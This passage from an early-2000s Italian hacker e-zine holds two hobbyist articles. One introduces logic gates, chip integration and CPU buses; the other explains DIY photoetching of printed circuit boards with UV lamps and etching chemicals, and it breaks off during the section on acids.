| ai vostri computers. Io scrivo solo per informare!!!!!                   |
|                                                                          |
|                                                                          |
| Salve ragazzi, oggi parleremo di un argomento un p≥ difficile ma         |
| interessante.Vi illustrer≥ i principi dell'elettronica digitale e di     |
| come abbia permesso lo sviluppo del computer, parleremo inoltre del      |
| funzionamento della CPU e di qualche altro elemento hardware :=) let's   |
| go.                                                                      |
|                                                                          |
| --------[Rudimenti di elettronica digitale]--------->                    |
|                                                                          |
| L'elettronica digitale si basa soprattutto sui transistors, che sono     |
| (per chi non lo sapesse :-) dei componenti elettronici. Possiamo         |
| paragonare un transistor (molto semplicisticamente) ad  un interruttore. | 
| A noi ci interessa soltanto sapere che quando poniamo in ingresso un     |
| potenziale  positivo questo si comporterα come un interruttore chiuso,   |
| mentre  se in ingresso gli mettiamo un potenziale negativo, questo si    |
| comporta come un interruttore aperto.                                    |
| Su questo principio si basano tutti i computers dal pi∙ piccolo al pi∙   |
| grande :-}, ogni azione  compiuta dai circuiti che compongono un         |
| computer non sono altro che manipolazioni di segnali binari. Dopo quello | 
| che abbiamo detto possiamo affermare che l'elettronica digitale si basa  |
| sulla commutazione della tensione ad es: ACCESO/SPENTO. Perci≥ i dati,   |
| che circolano in un pc o in                                              |
| qualsiasi altro apparecchio che basato sulla elettronica digitale, sono  |
| degli impulsi di tensione che sono "elaborati" da una serie di circuiti  |
| logici. Questi circuiti le famose NOT AND e OR.                          |
|                                                                          |
| Rappresentazione funzionale di un circuito AND                           |
|                                                                          |
|                 l1  /   l2 /                                             |
|           _________/  ____/  ______                                      |
|          |                         |                                     |
|          |                         |                                     |
|          |                         |                                     |
|         ----                       |                                     |
|        ------                     (X) <--Fate conto che sia una          |
|                                                                          |
|          |                         |  lampadina :-P                      |
|          |                         |                                     |
|          |                         |                                     |
|          |_________________________|                                     |
|                                                                          |
|                                                                          |
| Da questo schifoso :D ascii vediamo che la lampadina si pu≥ accendere    |
| solo se entrambi gli interruttori sono chiusi. Digitalmente (ma che      |
| razza di termine Φ :-P) parlando: gli interruttori chiusi corrispondono  |
| allo  stato "VERO" cioΦ 1 infatti basta che uno di essi sia a 0 che l'   |
| uscita  sia uno 0 logico, cioΦ spento:).                                 |
|                                                                          |
| Rappresentazione Funzionale del circuito OR                              |
|                                                                          |
|               l1   /                                                     |
|         __________/  _____________                                       |
|        |                          |                                      |
|        |         l2 /             |                                      |
|        |___________/  ____________|                                      |
|        |                          |                                      |
|      ----                        (X) <-----Altra lampadina :-)           |
|     ------                        |                                      |
|        |                          |                                      |
|        |                          |                                      |
|        |__________________________|                                      |
|                                                                          |
|                                                                          |
| Da questo schema che rappresenta un OR logico capiamo che basta un solo  |
| interruttore chiuso perchΦ si accenda la lampadina.                      |
|                                                                          |
|                                                                          |
| Da questi 2 schemi ci possiamo ricavare la tavola della veritα di AND e  | 
| OR                                                                       |
|                                                                          |
|   l1 l2  AND            l1  l2   OR                                      |
|  -------|------        ---------|-----                                   |
|   0   0 | 0             0   0   | 0                                      |
|   0   1 | 0             0   1   | 1                                      |
|   1   0 | 0             1   0   | 1                                      |
|   1   1 | 1             1   1   | 1                                      |
|                                                                          |
| l1 e l2 rappresentano gli interruttori.                                  |
|                                                                          |
|                                                                          |
| ---------------[Tecnologia LSI]------>                                   |
|                                                                          |
| Un transistor Φ relativamente piccolo, relativamente perchΦ se lo si     |
| rapporta ad un normale circuito pu≥ essere definito "piccolo", ma        |
| pensate quanto sarebbe grande una CPU con circa 50000 transistors???.    |
| L'idea geniale sta nel fatto che al posto di sfruttare un pezzo di       |
| silicio per ogni transitor, e poi collegarlo esternamente, su una        |
| piastra fotoincisa con la disposizione di tutti i transistors ed i       |
| collegamenti. Vi faccio un esempio per capire meglio: immaginate un      |
| pittore che invece di descrivere un storia scena per scena, dipinga un   |
| unico quadro. Pensate ora ad un chip come ad un insieme di circuiti      |
| logici  AND/OR/NOT che opportunamente combinati danno luogo ad           |
| un'operazione pi∙ complessa (lo so che Φ una definizione                 |
|  un p≥ tirata!!:P). La disposizione degli elementi attivi (transistors o | 
| anche un intero circuito logico ) viene ridotta fotograficamente fino a  |
|  dimensioni dell'ordine di  micron, che rende possibile l'integrazione   |
| di migliaia di funzioni logiche. I livelli di integrazione dei           |
| componenti sono tre:                                                     |
|                                                                          |
| -Livello SSI integrazione a bassa scala infatti si notata la bassa       |
| quantitα di chips e/o componenti ad es:le porte del nostro PC            |
|                                                                          |
| -Livello MSI integrazione di media scala, utilizzata per funzioni pi∙    |
| complesse come la memoria ed i controllori di I/O.                       |
|                                                                          |
| -livello LSI e VLSI integrazione su larga e larghissima scala per        |
| funzioni                                                                 |
| molto complesse ad es la stessa CPU.                                     |
|                                                                          |
| Ricordatevi questa semplice ma essenziale regola: le dimensioni del      |
| contenitore NON DIPENDONO dalla complessitα del chip ma dal numero di    |
| funzioni richieste.                                                      |
|                                                                          |
| ------------[Come funziona a graaandi linee un processore]----->         |
|                                                                          |
| Premessa:Data la complessitα dell' argomento mi sono dovuto aiutare con  |
| delle foto :-D.                                                          |
|                                                                          |
| Il primo passo per comprendere il funzionamento di un processore Φ di    |
| dimenticarci degli operatori AND/OR/NOT e di considerare dei blocchi     |
| logici cioΦ un insieme di circuiti logici che concorrono per             |
| l'espletamento di un'unica funzione. Per semplificarvi un p≥ le cose vi  |
| ho allegato alcune immagino (Scusate la qualitα :P). Il rettangolo sarα  |
| la nostra Cpu, in cui volta per volta andremo ad aggiungere qualcosa.    |
| Esaminiamo i collegamenti esterni, per prima cosa vediamo il Data Bus    |
| che Φ un insieme di 8 fili su cui arriveranno e partiranno una serie di  |
| segnali. Se ora guardiamo fig.2 troviamo una rappresentazione pi∙        |
| approfondita del Data Bus che semplicitα Φ ha solo due fili. La "stanza" | 
| A come vedete Φ collegata ad un dispositivo esterno RAM,ROM,I/O (stanza  |
| B).I fili della stanza possono dare tensione alla stanza B ad esempio    |
| accendendo l1 o l2, notate che la massa Φ in comune, proprio come        |
| avviene in un circuito vero :-). Se vogliamo inviare un dato ad un       |
| dispositivo (in questo caso la stanza B), dobbiamo effettuare un         |
| operazione chiamata "scrittura del dato". Il dispositivo per prima cosa  |
| deve essere avvisato affinchΘ sia pronto ricevere il dato, questa        |
| operazione viene effettuata con un ulteriore filo cioΦ la "linea di      |
| chiamata" (osservate fig.2 e vedrete che capirete). Adesso la stanza B Φ | 
| pronta a ricevere questo benedetto dato, operazione che consiste nella   |
| osservare lo stato delle lampadine fino a quando il telefono squilla, a  |
| questo punto A posizionerα gli interruttori S0 e S1 a suo piacimenti ed  |
| attiverα di conseguenza l'interruttore generale (IG) per dar tenzione.B  |
| allora vedrα le combinazioni possibili delle lampadine ON/OFF e ne       |
| prende subito nota, dato che A toglierα la chiamata (il telefono smette  |
| di squillare) e lo lascerα libero di fare quello che gli pare. Voglio    |
| precisare che quello che vi ho fatto vedere Φ un collegamento            |
| unidirezionale e nella realtα B Φ bidirezionale, ci≥ significa che anche | 
| B avrα degli interruttori ed A delle lampadine per visualizzare i dati.  |
| La differenza sta nel fatto che il processore per riavere un dato deve   |
| sempre fare una chiamata verso l' esterno. Ora qualcuno si potrebbe      |
| chiedere ma sto dispositivo esterno come fa a capire se la CPU gli       |
| chiede una lettura                                                       |
| (gli chiede un dato) o una scrittura ????Φ molto semplice, mediante due  |
| linee di controllo RD e WR (abilitazione alla lettura o alla scrittura   |
| :-).In pratica la CPU setta a 1 una di queste due linee di controllo.... | 
| semplice no? :-). Quando per≥ ci sono numerosi dispositivi collegati Φ   |
| scomodo pensare che per ognuno di essi ci sia una linea individuale,     |
| considerando fig.1 possimo aggiungere un' altra specifica ovvero che     |
| ogni dispositivo abbia un numero di telefono. Questo numero viebe        |
| chiamato "indirizzo", ora capite perchΦ in fig1 avevamo ci sono altri 16 | 
| fili in uscita, cioΦ il BUS degli indirizzi (Address Bus per gli         |
| Anglofili :PPP). Quando il processore chiama un dispositivo, per scivere | 
| o leggere,manda un codice su queste 16 linee, collegate in parallelo a   |
| tutti i dispositivi esterni. Ragioniamoci un p≥ su...su una linea dell'  |
| Address Bus possiamo trasmettere un segnale 0 o 1 (lampadina accesa),    |
| quindi su 2 le combianazioni sono 00,01,10,11 per un totale di tre       |
| combinazioni, su tre linee le combinazioni sono 8.... capite che il      |
| numero di combinazioni possibili dipende dalla potenza di 2. Con otto    |
| linee avremo 256 combinazioni....di conseguenza 65535 codici             |
| possibili!!, tanti possono essere i dispositivi collegabili esternamente | 
| alla CPU, ma per ovvie ragioni molti integrati ...come le memorie        |
| contengono migliaia di dispositivi singoli, rendendo pi∙ semplice l'     |
| interfacciamento altri circuiti.                                         |
|                                                                          |
| Bene, finalmente siamo ariivati alla fine, questo argomento Φ ancora     |
| abbastanza vasto. Forse ne scriver≥ anche il seguito :P. Vedremo!        |
|                                                                          |
| Saluti BIGAlex,Quequero,AndreaGeddon,e4m,Slash,Quake2^AM,Ntoskrnl,JeyOne | 
| ... e chi mi sono dimenticato :-)                                        |
| Mi potete trovare nei chan #hack #crack-it #asm #pmode e #hackmaniaci    |
|                                                                          |
| Bye                                                                      |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ MiSC                                       #08 - 01/11/2002 |
| CiRCUiTi STAMPATi                                    [TiN_MaN] 0x12/0x1A |
+--------------------------------------------------------------------------+
| Elettronica questa sconosciuta. Prima parte: I circuiti stampati.        |
|                                                                          |
| Ciao a tutti.                                                            |
|                                                                          |
| Piccola premessa per chi leggera' questo articolo: In questo articolo    |
| si parlera' di acidi e prodotti chimici e luce ultravioletta, sono       |
| cose PERICOLOSE se usate con leggerezza e senza la concentrazione        |
| necessaria, quindi prendete la massima precauzione possibile GUANTI DI   |
| GOMMA, OCCHIALI DI PROTEZIONE, VESTITI SOPRENTI, LOCALI AREATI, NON      |
| GUARDATE I TUBI ULTRAVIOLETTI ACCESI.                                    |
|                                                                          |
|                                                                          |
| Chiunque abbia una passione sviscerata per lo smanettamento con i        |
| computer prima o poi ha la voglia di poter interagire con il proprio     |
| computer verso il mondo esterno. E qui subentra l'elettronica, molti     |
| magari pensano che questo sia un scoglio insuperabile, non e' vero,      |
| non e' poi difficile costruirsi un circuito da uno schema preso in       |
| giro per internet, molto piu' difficile e' progettare un circuito        |
| funzionante, ma questo non e' lo scopo di questa pagina. Un circuito     |
| elettronico e' composto da diverse parti: i componenti, i cablaggi e     |
| il circuito stampato. I componenti si comprano, i cablaggi si fanno      |
| con del semplice filo di misura e tipo adeguato al circuito (ad          |
| esempio in campo audio si usa spesso il cavo schermato) il circuito      |
| stampato bisogna costruirlo, e questo e' quello che vi spieghero in      |
| questo testo, come costruirsi un circuito stampato funzionante senza     |
| spendere una esagerazione di Euro.                                       |
|                                                                          |
| Partiamo dal principio. Cosa e' un circuito stampato ? Un circuito       |
| stampato e' una base su cui saldare i componenti di un circuito, che     |
| li collega traloro nel modo corretto per il loro funzionamento           |
| sostituendo un collegamento fatto da fili volanti con piste di rame      |
| stampate (da qui' il nome), i vantaggi sono evidentissimi, facilita'     |
| di montaggio (pensate a dovere saldare 200 fili tra un componenti di     |
| pochi mm e l'altro) solidita' meccanica, riduzione drastica di errori    |
| di connessione tra componenti (se il circuito e' giusto e non fate       |
| ponticelli tra le piste errori di connessione tra i componenti NON ce    |
| ne saranno) prima dell'avvento dei circuiti stampati si usavano i fili   |
| e dei contatti a riga (una fila di contatti di rame isolati tra loro     |
| montati su supporto di bachelite) dove saldare i fili o i componenti,    |
| non vi dico in caso di guasto andare a ricercare dove fosse, quasi       |
| impossibile risalire al contatto guasto.                                 |
|                                                                          |
| Un circuito stampato e' composta da 2 parti, una base di materiale       |
| isolante e le piste di rame che riproducono i collegamenti, la base      |
| isolante e' fatta in fibra di vetro (vetroresina) un materiale molto     |
| isolante e con un'ottima solidita' meccanica, nei primi tempi si usava   |
| anche la Bachelite come supporto e si riservava la vetroresina solo      |
| per circuiti ad alta frequenza o ad alta tensione dato che la            |
| vetroresina era molto piu' costosa, oramai si usa solo la vetroresina    |
| visto che attualmente il suo costo produttivo e sceso moltissimo, se     |
| vi proponessero di acquistare basette con supporto di bachelite (lo      |
| vedete subito sono di colore marrone) non prendetele, la bachelite si    |
| rompe facilmente vanificando magari ore e ore di lavoro.                 |
|                                                                          |
| Quando acquistate un basetta per circuiti stampati sara' composta da 2   |
| strati uniformi di vetroresina e di rame, stara' a noi rimuovere il      |
| rame in eccesso e lasciare solo le piste di collegamento che ci          |
| servono.                                                                 |
|                                                                          |
| Passiamo alla parte piu' importante, come incidere il nostro bel         |
| circuito sulla basetta, per incidere una basetta ci sono 2 procedure,    |
| una chimica e una meccanica.                                             |
|                                                                          |
| L'incisione meccanica viene effettuata con una microfresa da una         |
| macchina CNC (a controllo numerico) ed e' possibile solo con             |
| attrezzature costosissime a livello industriale, quindi non la           |
| tratteremo in questo testo.                                              |
|                                                                          |
| Quello che ci interessa e' l'incisione chimica, esistono degli acidi     |
| che possono corrodere il rame, noi coprendo la parte che ci interessa    |
| possiamo quindi corrodere il rame che non ci interessa, parleremo        |
| degli acidi piu' avanti.                                                 |
|                                                                          |
| Ora la prima cosa da fare e' scegliere il metodo per coprire il rame     |
| che vogliamo rimanga sulla basetta in modo che non sia corroso           |
| dall'acido riproducendo il disegno del circuito. La copertura viene      |
| effettuata di solito con vernici o con materiale plastico adesivo. Per   |
| circuiti molto semplici si possono usare i trasferibili e i nastrini,    |
| i trasferibili sono dei fogli con riprodotti le piazzole di              |
| collegamento, le piste, le curve ecc.... si appoggiano sul ame e         |
| passando con un penna o una matita (meglio la matita) essi vengono       |
| trasferiti dal foglio alla basetta, ci vuole un sacco di pazienza e di   |
| calma, e' facile staccare una piazzola mentre se ne applica un'altra     |
| sopratutto se sono molto vicine, sono frequenti i distacchi durante      |
| l'incisione e ogni volta che si vuole riprodurre lo stesso circuito si   |
| riparte da capo, sono anche molto costosi. Un'altro metodo e' il         |
| pennarello, esistono dei pennarelli appositi per i circuiti stampati     |
| (vi assicuro che si puo' anche usare le OHpen della stabilo) e qui'      |
| sta' nella vostra abilita' nel disegno manuale che il circuito abbia     |
| un minimo di parvenza professionale. Se dovete fare un'alimentatore      |
| con grose piste per forti correnti un piccolo trucco e' quelo di usare   |
| del normale nastro isolante da elettricisti, costa poco copre molto ed   |
| e' resistente.                                                           |
|                                                                          |
| Il metodo attualmente piu' usato invece e' la Fotoincisione, un          |
| procedimento fotografico per trasferire il disegno del circuito da un    |
| foglio trasparente (pellicola) alla nostra basetta ramata.               |
| Fotoincisione, questa parola di solito fa' tremare il neofita il quale   |
| rinuncia e si perde in pennarelli, trasferibili ed accrocchi vari,       |
| cerchero' di togliere queste paure inmodo che possiate usare un metodo   |
| semplice veloce e preciso. Con la fotoincisione ci sono enormi           |
| vantaggi e pochissimi svantaggi. Vantaggi: Potete disegnare il           |
| circuito con il vostro bel computer e un programma apposito con          |
| semplicita', molto velocemente. Il disegno puo' essere usato per fare    |
| moltissimi circuiti uguali. Il tempo di realizzazione e' rapido          |
| rispetto agli altri sistemi. Precisione estrema del circuito. Aspetto    |
| professionale. Svantaggi: Qualche attrezzatura in piu'. Uso di           |
| un'acido in piu' (sviluppo).                                             |
|                                                                          |
| Come vedete i vantaggi sono di molto superiori agli svantaggi.           |
|                                                                          |
| Come funziona il processo di fotoincisione, sulla parte ramata della     |
| basetta viene applicata una vernice fotosensibile ai raggi               |
| ultravioletti (Photoresist), si applica sopra questa vernice un foglio   |
| trasparente con il nostro circuito disegnato con inchiostro NON          |
| trasparente, si espone il tutto a una luce ultravioletta che inondera'   |
| tutta la vernice fotosensibile di luce tranne che nelle parti coperte    |
| (il nostro circuito) i raggi ultraviletti modificano chimicamente la     |
| vernice permettendone il distacco se immersa in un bagno di sviluppo.    |
| Piu' facile a farsi che a dirsi non vi preoccupate, il Photoresist si    |
| puo' applicare a basette normali oppure si possono comprare delle        |
| basette presensibilizzate, ovvero con il photoresist gia' applicato in   |
| fabbrica, conviene usare queste ultime, applicare il Photoresist e'      |
| molto difficile, va messo in modo perfettamente uniforme, va fatto       |
| asciugare in forno a temperatura constante, il tutto lo dovete fare      |
| praticamente al buio e il risparmio e' modesto.                          |
|                                                                          |
| Per incidere correttamente una basetta come abbiamo detto prima ci       |
| vuole una fonte di raggi ultravioletti, esistono diverse fonti           |
| utilizzabili, il sole ad esempio e' una fonte di raggi ultravioletti,    |
| alcune lampade tipo le solari della Philips, e poi ci sono i tubi al     |
| Neon appositi come gli Hitachi F8T5 che sono quelli che uso io. Ora un   |
| tubo Hitachi F8T5 costa piu' o meno 4 Euro un reattore e uno starter     |
| li potete trovare in una vecchia plafoniera, o comprarli, vi assicuro    |
| che gia' con un solo tubo o due potete fare dei bei circuiti in poco     |
| tempoe di discrete dimensioni, io mi sono fatto una scatola di legno     |
| con 4 tubi, 4 reattori e 4 starter, tra scatola tubi starter reattori    |
| vetro ho speso all'incirca 50 Euro ma con solo 2 tubi messi in serie,    |
| un reattore due starter e una scatola recuperata con meno di 20 Euro     |
| avete il vostro Bromografo funzionante, posso suggerirvi un'idea, se     |
| avete un vecchio scanner piano rotto potete usarlo benissimo, montate    |
| i 2 tubi all'interno ed avete gia' il contenitore il vetro e il          |
| coperchio pronti con anche una discreta estetica.                        |
|                                                                          |
| Comunque qualsiasi contenitore di plasita, di legno o di ferro vanno     |
| benen (con quest'ultimo fate molta attenzione agli isolamenti pero' e    |
| mettetelo a terra) una scatola da scarpe se proprio non avete altro      |
| anche se il cartone non ha una buona tenuta meccanica e ricordatevi      |
| sempre che lavorate con tensione di rete.                                |
|                                                                          |
| Una volta scelto il contenitore piazzate i neon, se ne mettete 4 come    |
| distanza tra un neon e l'altro potete lasciare 3 cm 3,5 cm se ne usate   |
| 2 lasciate 4/5 cm. Come distanza tra neon e vetro con 4 tubi lasciate    |
| 2 cm o 2,5 cm con 2 tubi lasciate 4 cm. Il vetro e la basetta            |
| sottostante devono essere illuminati nella maniera piu' uniforme         |
| possibile oppure verrano zone piu' illuminate e zone meno rendendo       |
| vani i vostri sforzi.                                                    |
|                                                                          |
| Il vetro deve essere ben trasparente e spesso, almeno 5 mm. con vetri    |
| piu' sottili c'e' il il rischio che si incurvi non premendo bene il      |
| master sulla basetta e lasciando filtrare della luce in punti non        |
| voluti.                                                                  |
|                                                                          |
| In allegato trovate la Fotografia CS1.jpg in cui potete vedere il mio    |
| bromografo.                                                              |
|                                                                          |
| Una piccola parentesi, con il bromografo, solo cambiando il neon,        |
| potete anche cancellare le EEprom finestrate, basta che vi procuriate    |
| un tubo al neon del tipo Germicida (le EEprom per essere cancellate      |
| hanno bisogno di una frequenza di Ultravioletti diversa da quella per    |
| incidere le basette) che costa sui 15 Euro ed avrete cosi' un            |
| cancellatore di EEprom funzionale e a basso costo (un cancellatore       |
| commerciale costa piu' di 100 Euro).                                     |
|                                                                          |
| Il bromografo puo' seguire 2 filosofie costruttive, con i neon sopra e   |
| il vetro mobile, con il vetro fisso e i neon sotto al vetro (esempio     |
| il vacchio scanner piano) il secondo metodo forse e' piu' facile da      |
| realizzare ma questo dipende dalle vostre preferenze oggettive, se       |
| mette i neon sotto al vetro vi cosiglio di mettere uno specchio sulla    |
| base sotto ai neon (che tra l'altro aumenta l'efficacia dei neon) in     |
| modo da vedere il posizionamento del master con precisione.              |
|                                                                          |
| Ora che abbiamo il nostro bel bromografo ci rimangono da procurare       |
| altre cose:                                                              |
|                                                                          |
| Il liquido di sviluppo. Un pennellino. Una pinzetta in plastica. Delle   |
| bacinelle basse e abbastanza larghe per lo sviluppo e il riaciaquo.      |
| Acqua (be questa basta che apriate il rubinetto e ne avete quanta ne     |
| volete). Delle basette presensibilizzate. Il master del circuito.        |
|                                                                          |
| Il Master.                                                               |
|                                                                          |
| Iniziamo a parlare del Master, per master si intende la pellicola        |
| trasparente con il disegno in NERO (non trasparente) delle nostre        |
| piste, il disegno lo potete prelevare da internet, scanerizzarlo da      |
| una rivista, fotocopiarlo da disegno su carta. Se avete il disegno sul   |
| computer dovete stamparlo, in maniera che le piste risultino il meno     |
| trasparenti possibili, se avete una stampante Laser mette                |
| l'impostazione del toner al massimo con una stampante a getto di         |
| inchiostro usate un buon nero, io ad esempio mi sono trovato molto       |
| bene con le cartucce di nero Pellikan su stampante Epson, poi sono       |
| passato a una Laser HP IIIP ed ora ho una HP 5p. Supporto cartaceo,      |
| come carta per il Master si possono usare i fogli di acetato             |
| trasparente appositi per le stampanti, assicuratevi di prendere quelli   |
| giusti per il modello di stampante, Ink Jet o Laser, se avete una        |
| Laser potete usare anche i fogli di carta lucida, sono fogli             |
| semitrasparenti di colore verdognolo/grigiastro che si usano per il      |
| disegno tecnico, costano poco e funzionano benissimo sopratutto per      |
| master singoli o con disegni non troppo fitti di piste o con piste non   |
| troppo sottili. Se avete dei circuiti molto incasinati, con piste        |
| sottili, vicine e molto fitti vi conviene inviare/portare il vostro      |
| disegno a una tipografia e farvelo stampare su carta fotomeccanica, vi   |
| verra' consegnata una pellicola trasparentissima con un nero             |
| irriproducibile senza le apparecchiature idonee e veramente              |
| funzionale, io inviao tramite E-Mail i disegni alla tipografia che ho    |
| di fronte e il giorno dopo li ritiro pronti, con una spesa di 3 Euro     |
| per un foglio A4, sul foglio potete mettere piu' disegni se piccoli e    |
| poi ritagliarli, questo lo potete fare per Master difficili o che        |
| dovete uare molte volte e volete un buon lavoro finale ma non e'         |
| obbligatorio, per un circuito semplice usate l'acetato con la vostra     |
| stampante o la carta da lucido con la Laser. Una cosa importante,        |
| dovete sempre fare in modo che il disegno rimanga diritto sotto al       |
| foglio e non sopra, ovvero che l'inchiostro sia a diretto contatto con   |
| le piste di rame, altrimenti la luce ultravioletta passera' sotto le     |
| piste disegnate distruggendo le piu' sottili in fase di sviluppo.        |
| Quindi stampate sempre al contrario il vostro disegno e poi girate il    |
| foglio. Volendo potete anche stamparlo a rovesio su carta bianca         |
| normalissima e poi fotocopiarlo con fotocopiatrice Laser su acetato o    |
| su carta da lucido se la vostra ink jet non riesce a stampare su         |
| questi supporti.                                                         |
|                                                                          |
| Il liquido di sviluppo. Il liquido di sviluppo altri non e' che acqua    |
| con soda caustica, per i primi esperimenti comprate una bustina da       |
| sciogliere nell'acqua o una bottiglia di sviluppo gia' pronta, in        |
| seguito raffinata la tecnica, i tempi di esposizione e i tempi di        |
| sviluppo ve lo potete fare in casa, mettendo 7/8 grammi di soda          |
| caustica in acuqa demineralizzata, la soda caustica sciolta costa meno   |
| di 3 Euro al Kilogrammo e l'acqua demineralizzata 20 centesimi al        |
| litro, non urlate subito ai ladri per chi vende quello gia' pronto, lo   |
| sappiamo che e' cosi', ma le prime volte meglio avere almeno uno dei     |
| componenti con dosaggi giusti, altrimenti in caso di errore si           |
| potrebbe imputare a un errore operativo quello che poi e' lo sviluppo    |
| errato.                                                                  |
|                                                                          |
| Bacinelle.                                                               |
|                                                                          |
| Si lavora con la soda caustica, ma in concentrazioni molto ridotte, se   |
| ci mettete le dita dentro non succede niente, lavatele subito,           |
| comunque se e' possibile meglio evitare e lavorare con delle pinzette    |
| di plastica le bacinelle di tipo fotografico sono eccezzionali,          |
| resistono a qualsiasi acido, sono basse, hanno dei piccoli rilievi sul   |
| fondo per agevolare la presa della basetta dal fondo, ma........ sono    |
| costose. Dei contenitori in plastica per congelare gli alimenti vanno    |
| bene ugualmente costano poco (o niente se si rubano a mamme/mogli) e     |
| di solito sono abbastanza spessi per l'uso con gli acidi, se fossero     |
| troppo sottili cercatene degli altri, hanno pure il coperchio di         |
| solito per poter spostare la bacinella piena di acidi dal laboratorio    |
| al bagno senza inondarvi. Se non lavorate in un posto con un rubinetto   |
| e un lavandino molto vicini di bacinelle ve ne servono due, una per lo   |
| sviluppo e una per l'acqua di risciaquo.                                 |
|                                                                          |
| Basette presensibilizzate. La basette presensibilizzate si comprano      |
| nei negozi dicomponenti elettronici, vengono bendute conl apare ramata   |
| e ricoparta di Photoresist coperta da un foglio adesivo, lasciate        |
| sempre il foglio adesivo per la conservazione e il teglio, toglietelo    |
| solo nel omento in cui mette la basetta nel bromografo per               |
| l'incisione. Il prezzo puo' variare per marca e dimensioni, se potete    |
| frequentare delle fiere dell'elettronica e radioamatori potrete          |
| trovare banchi che vendono ritagli di bastte industriali, in vari e      |
| frome, io ho acquaistato delle strisce di 6 cm di larghezza per 120 cm   |
| di lunghezza, 10 strisce 5 Euro, fate delle prove con i tempi ogni       |
| volta che cambiate marca di basette, ad esempio questi ritagli           |
| professionali hanno un photoresist leggermente piu' spesso delle         |
| amtoriali e nel mio caso richiedono 30 secondi di esposizione in piu'    |
| di quelle che prendo dal negoziante cittadino altrimenti quando le       |
| metto a bagno nell'acido di corrosione sembra che il rame non si         |
| incida, si vede il disegno ma rimane uno strato sottilissimo di          |
| Photoresist che protegge il rame dal'acido (ne ho buttate via un paio    |
| prima di capire cosa succedesse) aumentato il tempo si e' incisa         |
| perfettamente.                                                           |
|                                                                          |
| Ora che abbiamo tutto possiamo provare la nostra prima fotoincisione,    |
| ritagliamo una striscia di basetta presensibilizzata di almeno 2 cm, e   |
| prepariamo un master con delle righe parallele, alcune sottile e         |
| alcune spesse ma vicine ritaglilamo dei quandratini 2 X 3 Cm di          |
| basetta e iniziamo a fare delle prove con il tempo di esposizione e il   |
| nostro bromografo, mettiamo la basetta (togliendo l'adesivo di           |
| protezione) appogiamoci sopra il nostro master di prova (con la parte    |
| inchiostarta a diretto contatto conil photoresit), mettiamo sopra il     |
| master il vetro in modo che lo comprima sulla basetta in maniera         |
| uniforme, e accendiamo finalmente la nostra fonte di luce                |
| ultravioletta guardando l'orologio, come prima prova consiglio di        |
| provare con 1 minuto e 30 secondi se avete un bromografo a 4 tubi, con   |
| 2 minuti se avete un bromografo a 2 tubi e 2 minuti e 30 secondi se      |
| avete un tubo solo. Passato il tempo spegnete i tubi, aprite il          |
| bromografo (mai guardare gli ultravioletti sono dannosi per gli occhi)   |
| prendete la vostra basetta e mettetela nella bacinella dello sviluppo,   |
| aspettate almeno 5 secondi e poi con un penellino morbido passatelo      |
| sulla basetta (solo le setole naturalmente attenti a non graffiarlo      |
| con parti solide del pennello o rigate il photoresist iin maniera        |
| pericolosa per il futuro funzionamento del circuito) dovreste vedere     |
| il liquido disviluppo che si intorbidisce e apparire il vostro disegno   |
| sulla basetta (la prima volta che vedete questa cosa e' una esperienza   |
| molto gratificante, sa quasi di magico) quando il disegno e' bello       |
| nitido e vi sembra che il rame si e' scoperto del tutto (di solito       |
| 15/20 secondi se il bagno di sviluppo non e' troppo freddo) prendete     |
| con l e pinzette la basetta e mettetela nell abcinella di acqua o        |
| risciaquatela sotto al rubinetto. Osservatela bene, se alcune piste si   |
| sono mangiate o sono sparite del tutto vuol dire che avete esposto per   |
| troppo tempo e dovete ridirre il tempo di esposizione ai raggi           |
| ultravioletti, se invece ci sono delle piste attaccate dove non          |
| dovrebbero provate a rimettere la basetta nello sviluppo, se invece di   |
| staccarsi le piste viene via anche il photoresist che avrebbe dovuto     |
| rimanere allora provate ad aumentare il tempo di esposizione ai raggi    |
| ultravioletti. Quando la basetta e' venuta nitida senza piste            |
| attaccate siete pronti per l'incisione del rame. Prima pero' un paio     |
| di considerazioni, la fotoincisione e' un tecnica che si basa molti      |
| fattori variabili, il vostro bromografo e la sua intensita' di luce      |
| ultravioletta influisce sui tempi di esposizione, per questo ci          |
| vogliono delle prove all'inizio, questi tempi variano da bromografo a    |
| bromografo e da marca di basetta a marca di basetta, la tecnica della    |
| fotoincisione richiede della pratica, non scoraggiatevi se alle prime    |
| non ci riuscite, cerate ci capire i vostri errori o di trovare i tempi   |
| giusti per voi. Il liquido di sviluppo puoo' influire molto sulla        |
| procedura, se e' stato in cantina al freddo per diversi giorni invece    |
| che in 20 secondi sviluppera' in 3 minuti, quindi se possibile           |
| scaldatelo a temperatura ambiente o appena tepido, mettete il            |
| contenitore a bagnomaria (dentro una pentola con acqua calda) se lo      |
| sentite molto freddo dall'esterno, non deve bollire ma non deve essere   |
| freddo, se lo tenete in casa in locale riscaldato non ci dovrebbero      |
| essere problemi, io per scaldarlo uso un riscaldatore da acquari a       |
| immersione ad esempio visto che nel mio garage d'inverno ci sono pochi   |
| gradi, d'estate non lo scaldo neanche.                                   |
|                                                                          |
| Esiste anche un'altro metodo per fare i circuiti stampati oltre la       |
| fotoincisione, ci sono dei fogli che si chiamano Press'n Peel di         |
| colore blu', si stampa il disegno con la laser sui fogli e poi con il    |
| ferro da stiro si riporta il disegno su una basetta ramata, ma sono      |
| costosi, alla fine un bromografo vi dura per sempre e vi costa come      |
| due confezioni da 5 di questi fogli, e non sono neanche molto pratici    |
| (siete obbligati ada vere un ferro da stiro a portata di mano, quindi    |
| se avete il vostro laboratorio in un garage dovete andare a casa per     |
| stirare i fogli sulla basetta, tornare in garage inciderla, se non va'   |
| bene ritornare a stirare ecc. personalmente non mi piace come metodo,    |
| anche se a prima vista sembra piu' semplice della fotoincisione una      |
| volta presa la mano la fotoincisione e' piu' rapida e precisa io         |
| riesco a passare dal disegno sul computer alla basetta pronta da         |
| forare in 15 minuti.                                                     |
|                                                                          |
| Acido di Incisione del rame.                                             |
|                                                                          |
| Passiamo adesso al sistema di rimozione del rame non coperto dal         |
| nostro Photoresist o dai nostri trasferibili, vernici, pennarelli,       |
| nastri adesivi, smalto da unghie e varie..... Ci sono diverse            |
| soluzioni per incidere il rame, diversi acidi chimici hanno la           |
| capacita' di scioglierlo, ecco i piu' usati:                             |
|                                                                          |
| Percloruro Ferrico. Persolfato di ammonio. Acido cloridrico/Acqua        |
| ossigenata.                                                              |
|                                                                          |
| Il primo e' il piu' tradizionale, e' un acido di colore marone scuro,    |
| macchi in maniera indelebile qualsiasi cosa di un bel marrone.....       |
